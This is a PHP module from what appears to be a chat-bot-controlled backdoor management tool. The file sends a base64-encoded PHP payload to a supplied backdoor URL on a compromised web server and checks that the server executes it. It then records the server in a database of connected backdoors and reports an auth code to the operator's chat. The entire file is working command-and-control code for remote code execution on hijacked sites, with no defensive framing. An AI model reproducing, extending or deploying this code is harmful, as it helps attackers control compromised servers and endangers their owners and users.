<?php

namespace Modules;

use Classes\GlobalAction;
use Database\Database;

class connectModule extends Module
{
    public function __construct($chat_id = null)
    {
        if($chat_id === null)
        {
            die();
        }
        $this->addField('backdoorUrl','required');
        $this->chat_id = $chat_id;
    }

    private function checkifbackdoored()
    {
        $string = str_shuffle("AZERTYUIOPQSDFGHJKLMWXCVBN");
        $code = substr($string,0,5);
        $payload = 'echo "'.$code.'";die();';
        $this->payload = base64_encode($payload);

        $return = GlobalAction::sendPost($this->getOneField('backdoorUrl'), ['c' => $this->payload]);
        if(trim($return) == $code)
        {
            $insert = Database::addBackdoorToList($this->getOneField('backdoorUrl'));
            if($insert !== false)
            {
                GlobalAction::moduleMessage('_Backdoor as been configured with authcode : '.$code.'_', $this->chat_id);
                return true;
            }
            GlobalAction::moduleMessage('*error:* backdoor already connected to master?', $this->chat_id);
            return false;
        }
        GlobalAction::moduleMessage('Cannot configure backdoor please verify target url', $this->chat_id);
        return false;
    }

    public function run()
    {
        $this->checkifbackdoored();
    }

}